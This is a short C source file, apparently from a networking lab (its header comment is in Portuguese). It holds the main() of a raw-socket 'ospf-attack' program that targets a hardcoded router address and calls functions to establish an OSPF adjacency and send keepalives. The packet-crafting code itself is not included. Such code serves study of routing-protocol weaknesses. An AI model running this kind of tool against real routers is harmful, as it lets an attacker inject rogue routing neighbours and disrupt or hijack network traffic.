/*-------------------------------------------------------------*/
/* Exemplo Socket Raw - envio de mensagens                     */
/*-------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/if_ether.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <netinet/ether.h>
#include <arpa/inet.h>

#include "utils.h"
#include "ospf.h"
#include "ospf_attack.h"

unsigned char *parse_ip_addr(char *ip_str);

extern int errno;

int main(int argc, char *argv[]) {
  if (argc != 5) {
    printf("Usage: ospf-attack INTERFACE_NAME INTERFACE_NUMBER LOCAL_MAC_ADDR LOCAL_IP_ADDR\n\n");
    exit(1);
  }

  struct attack_env env;
  env.sock_fd     = create_socket(argv[1]);
  env.iface_name  = argv[1];
  env.iface_index = atoi(argv[2]);
  env.router_ip   = "192.168.3.1";
  env.local_mac   = parse_mac_addr(argv[3]);
  env.local_ip    = argv[4];

  attack_establish_adjacency(&env);
  attack_send_keepalive(&env);

  return 0;
}
